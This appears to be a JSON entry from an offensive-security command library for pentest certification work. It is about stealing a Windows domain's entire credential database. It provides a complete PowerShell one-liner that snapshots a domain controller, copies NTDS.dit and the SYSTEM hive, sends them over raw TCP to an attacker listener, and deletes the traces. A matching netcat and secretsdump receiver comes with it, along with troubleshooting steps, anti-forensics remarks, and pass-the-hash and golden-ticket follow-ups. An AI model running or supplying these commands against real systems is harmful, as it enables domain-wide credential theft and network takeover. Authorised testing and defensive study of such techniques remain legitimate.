{
  "category": "post-exploit",
  "subcategory": "credential-extraction",
  "description": "VSS shadow copy NTDS.dit extraction with TCP exfiltration one-liner combos",
  "commands": [
    {
      "id": "post-vss-ntds-exfil-combo",
      "name": "VSS NTDS.dit + SYSTEM Extract & Exfil (PowerShell One-liner)",
      "category": "post-exploit",
      "subcategory": "credential-extraction",
      "command": "$DRIVE=\"C:\"; $LHOST=\"<LHOST>\"; $LPORT=<LPORT>; $VSHADOW=\"<VSHADOW_PATH>\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force",
      "description": "Complete PowerShell one-liner: Creates VSS shadow copy with vshadow.exe, extracts NTDS.dit and SYSTEM hive, compresses to zip, exfiltrates via raw TCP socket, and cleans up all artifacts. Alternative to DCSync when replication rights unavailable but local admin on DC exists.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "VSS",
        "NTDS",
        "CREDENTIAL_ACCESS",
        "POST_EXPLOITATION",
        "ONE_LINER",
        "TCP_EXFIL",
        "POWERSHELL",
        "WINDOWS"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address where nc listener is running",
          "example": "192.168.45.xxx",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port on attacker machine",
          "example": "9001",
          "required": true
        },
        {
          "name": "<VSHADOW_PATH>",
          "description": "Full path to vshadow.exe on target DC (must be pre-uploaded)",
          "example": "C:\\Tools\\vshadow.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "$DRIVE": "Target drive letter for VSS snapshot (C: contains NTDS.dit on DCs). Colon required.",
        "-nw": "No-writers option for vshadow.exe - disables VSS writers for faster snapshot creation. Safe for NTDS.dit - AD handles consistency internally.",
        "-p": "Persistent shadow copy - stores on disk (survives reboot). Required for file extraction operations.",
        "[regex]::Match()": "PowerShell regex to extract shadow copy device name (HarddiskVolumeShadowCopyN) from vshadow.exe output for path construction.",
        "mklink /d": "Creates directory symbolic link C:\\sc pointing to shadow copy device. Allows standard file operations on locked NTDS.dit via shadow path.",
        "reg save hklm\\system": "Exports SYSTEM registry hive containing boot key (syskey) required to decrypt NTDS.dit password hashes.",
        "Compress-Archive -Force": "PowerShell native compression. -Force overwrites existing zip. Combines ntds.dit + system.bak into single file for efficient exfil.",
        "[IO.File]::ReadAllBytes()": ".NET method to read entire zip file as byte array for raw TCP transmission. Preserves binary integrity.",
        "Net.Sockets.TcpClient": "PowerShell .NET TCP socket client - sends raw binary data to listener without protocol overhead.",
        "Remove-Item -Force": "Cleanup: Deletes extracted files and zip to minimize forensic artifacts on target."
      },
      "success_indicators": [
        "Shadow copy set succesfully created (vshadow output)",
        "symbolic link created for C:\\sc (mklink output)",
        "1 file(s) copied (copy ntds.dit output)",
        "The operation completed successfully (reg save output)",
        "No errors during Compress-Archive",
        "TCP connection established (no exceptions)",
        "File received on listener side (loot.zip appears)"
      ],
      "failure_indicators": [
        "Access is denied - insufficient privileges (not local admin)",
        "vshadow.exe is not recognized - path incorrect or file not uploaded",
        "The system cannot find the path specified - NTDS.dit not at expected location",
        "Exception calling TcpClient - listener not running or firewall blocking",
        "Compress-Archive : Cannot bind argument - PowerShell version too old (<5.0)",
        "mklink: You do not have sufficient privilege - not running as admin"
      ],
      "troubleshooting": {
        "vshadow.exe not found": "Verify path: Test-Path $VSHADOW. Upload vshadow.exe from Windows SDK or use vssadmin alternative: vssadmin create shadow /for=C:",
        "Access denied": "Requires local Administrator on DC. Verify: net localgroup Administrators %USERNAME%. Run from elevated PowerShell.",
        "NTDS.dit not found": "Non-standard install location. Find it: dir C:\\ /s /b | findstr ntds.dit OR check registry: (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters').'Database log files path'",
        "TCP connection refused": "Ensure listener started FIRST on Kali: nc -lvnp <LPORT> -q 0 > loot.zip. Check firewall allows outbound from DC.",
        "Compress-Archive not found": "PowerShell <5.0. Alternative: Manually copy ntds.dit and system.bak separately using two TCP transfers, or use certutil for base64 encoding.",
        "Incomplete zip received": "Network timeout. Increase -q value on listener: nc -lvnp <LPORT> -q 5 > loot.zip. Or verify DC can reach Kali: Test-NetConnection -ComputerName <LHOST> -Port <LPORT>",
        "secretsdump fails after transfer": "Files corrupted during transfer. Verify: unzip -t loot.zip. Re-run one-liner. For large NTDS.dit (>100MB), consider SMB transfer instead."
      },
      "prerequisites": [
        "ad-vshadow-create-shadow",
        "post-nc-receive-zip-secretsdump"
      ],
      "alternatives": [
        "ad-dcsync-impacket-secretsdump-user",
        "ad-vssadmin-create-shadow"
      ],
      "next_steps": [
        "ad-secretsdump-parse-ntds"
      ],
      "notes": "certification ONE-LINER COMBO: Complete credential extraction in single command execution. USE CASE: When DCSync unavailable (no replication rights) but have local Administrator on DC.\n\nPREREQUISITES:\n1. Local Administrator on Domain Controller\n2. vshadow.exe uploaded to DC (from Windows SDK)\n3. PowerShell 5.0+ (Compress-Archive requirement)\n4. Network connectivity from DC to Kali on specified port\n5. Netcat listener started FIRST on attacker machine\n\nWORKFLOW:\n1. Start listener on Kali: nc -lvnp 9001 -q 0 > loot.zip\n2. Execute one-liner on DC (paste entire command)\n3. Wait for transfer (~30sec-2min depending on NTDS.dit size)\n4. On Kali: unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL\n\nOPSEC CONSIDERATIONS:\n- Creates persistent shadow copy (auto-deleted NOT implemented - delete manually if needed)\n- mklink/rmdir operations logged (Event ID 4663 if object access auditing enabled)\n- TCP egress from DC to arbitrary port may trigger alerts\n- Files temporarily written to C:\\ root (visible to other admins)\n\nTIME ESTIMATE: 1-5 minutes depending on domain size (NTDS.dit typically 20-500MB)\n\nALTERNATIVE WITHOUT VSHADOW: Replace vshadow.exe with vssadmin:\n$out = vssadmin create shadow /for=C: | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; ...\n\nMANUAL ALTERNATIVE: Run each step separately (see ad-shadow-copies.json commands)\n\nVS DCSYNC: DCSync is stealthier (no file creation, uses replication protocol). Use this method when DCSync unavailable due to insufficient privileges but local admin access exists on DC.",
      "filled_example": "$DRIVE=\"C:\"; $LHOST=\"192.168.45.xxx\"; $LPORT=9001; $VSHADOW=\"C:\\Tools\\vshadow.exe\"; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\\d+').Value; cmd /c \"mklink /d C:\\sc \\\\?\\GLOBALROOT\\Device\\$sc\\\"; copy C:\\sc\\Windows\\NTDS\\ntds.dit C:\\ntds.dit; reg save hklm\\system C:\\system.bak; cmd /c \"rmdir C:\\sc\"; Compress-Archive -Path C:\\ntds.dit,C:\\system.bak -DestinationPath C:\\loot.zip -Force; $f=[IO.File]::ReadAllBytes(\"C:\\loot.zip\"); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force"
    },
    {
      "id": "post-nc-receive-zip-secretsdump",
      "name": "Receive NTDS Zip + Parse with secretsdump",
      "category": "post-exploit",
      "subcategory": "credential-extraction",
      "command": "nc -lvnp <LPORT> -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL",
      "description": "Attacker-side combo: Netcat listener receives compressed NTDS.dit + SYSTEM zip, extracts files, and parses offline with impacket-secretsdump to extract all domain credentials.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "NTDS",
        "CREDENTIAL_ACCESS",
        "POST_EXPLOITATION",
        "NETCAT",
        "LINUX"
      ],
      "variables": [
        {
          "name": "<LPORT>",
          "description": "Port to listen on (must match target-side command)",
          "example": "9001",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Listen mode - nc becomes server waiting for incoming connection from target DC.",
        "-v": "Verbose - displays connection details when target connects.",
        "-n": "No DNS resolution - use IP addresses only for faster connection handling.",
        "-p": "Port specification (some nc versions don't require -p flag).",
        "-q 0": "Quit immediately after EOF received (connection closed by sender). Critical for chaining with && operators. Without -q, nc may hang waiting for more data.",
        "> loot.zip": "Redirect received bytes to loot.zip file. Binary-safe - preserves zip integrity.",
        "&&": "Shell operator - execute next command only if previous succeeded. Ensures unzip only runs after complete transfer.",
        "unzip loot.zip": "Extract ntds.dit and system.bak from received archive.",
        "-ntds": "Path to NTDS.dit database file for secretsdump offline parsing.",
        "-system": "Path to SYSTEM registry hive containing boot key for NTDS.dit decryption.",
        "LOCAL": "Keyword for secretsdump offline mode - parse local files without network connection to target."
      },
      "success_indicators": [
        "Listening on 0.0.0.0 <PORT>",
        "Connection received from <DC_IP>",
        "Archive:  loot.zip (unzip output)",
        "inflating: ntds.dit",
        "inflating: system.bak",
        "[*] Target system bootKey:",
        "[*] Dumping Domain Credentials",
        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:"
      ],
      "failure_indicators": [
        "Address already in use - port taken",
        "End-of-central-directory signature not found - incomplete/corrupt zip",
        "[-] NTDS database not found - file extraction failed",
        "[-] SYSTEM hive not found - system.bak missing from zip",
        "Connection reset by peer - target disconnected prematurely"
      ],
      "troubleshooting": {
        "Address already in use": "Port occupied. Find process: sudo lsof -i :<PORT>. Kill or use different port.",
        "Corrupt zip file": "Transfer incomplete. Check file size: ls -lh loot.zip (should be >20MB typically). Re-run: Delete loot.zip, restart listener, re-execute target command.",
        "unzip: cannot find": "Kali missing unzip. Install: sudo apt install unzip. Or use: python3 -m zipfile -e loot.zip .",
        "secretsdump errors": "Wrong file names. Check: unzip -l loot.zip (list contents). If named differently, adjust: impacket-secretsdump -ntds <actual_name> -system <actual_name> LOCAL",
        "No connection received": "Firewall blocking, wrong IP on target side, or target command failed. Verify: Target can reach Kali port with Test-NetConnection. Check target error output.",
        "nc hangs after transfer": "Missing -q flag. nc without -q waits indefinitely. Kill with Ctrl+C, file likely complete. Restart with -q 0 for cleaner operation."
      },
      "prerequisites": [],
      "alternatives": [
        "ft-nc-receive"
      ],
      "next_steps": [],
      "notes": "ATTACKER-SIDE RECEIVER: Start this BEFORE executing target-side one-liner.\n\nWORKFLOW:\n1. Run this command on Kali (starts listener)\n2. Execute post-vss-ntds-exfil-combo on target DC\n3. Wait for transfer (30sec-2min)\n4. Command auto-continues: unzip \u2192 secretsdump\n5. All domain credentials printed to terminal\n\nOUTPUT CAPTURE: Pipe to file for later reference:\nnc -lvnp <LPORT> -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL | tee domain_hashes.txt\n\nOUTPUT FORMAT:\ndomain\\username:RID:LMhash:NThash:::\nExample: CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::\n\nKEY HASHES TO LOOK FOR:\n- Administrator:500 - Domain Admin NTLM for Pass-the-Hash\n- krbtgt:502 - Golden Ticket creation (RID 502)\n- Service accounts - Often have weak passwords, crack with hashcat\n\nNEXT STEPS AFTER EXTRACTION:\n- Pass-the-Hash: impacket-psexec -hashes :NThash administrator@target\n- Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt\n- Golden Ticket: ticketer.py with krbtgt hash\n\nCLEANUP: rm loot.zip ntds.dit system.bak (remove sensitive files after use)\n\nTIME ESTIMATE: <1 minute for secretsdump parsing (most time is transfer wait)",
      "filled_example": "nc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL"
    }
  ],
  "metadata": {
    "file_purpose": "VSS shadow copy NTDS.dit extraction and TCP exfiltration one-liner combo commands for rapid domain credential harvesting",
    "educational_context": "This combo technique chains multiple operations: VSS shadow copy creation (bypasses locked NTDS.dit), file extraction, compression, raw TCP exfiltration (no HTTP overhead), and offline parsing. Useful when DCSync replication rights unavailable but local admin on DC exists.",
    "prerequisites": [
      "Local Administrator OR SeBackupPrivilege on Domain Controller",
      "vshadow.exe uploaded to target DC (or use vssadmin alternative)",
      "PowerShell 5.0+ on target (for Compress-Archive)",
      "Network connectivity: DC can reach Kali on specified port (outbound)",
      "Netcat available on Kali (apt install netcat-traditional)"
    ],
    "related_techniques": [
      "ad-shadow-copies.json",
      "netcat-transfers.json",
      "ad-dcsync.json"
    ],
    "attack_chain_reference": "post-vss-ntds-tcp-exfil"
  }
}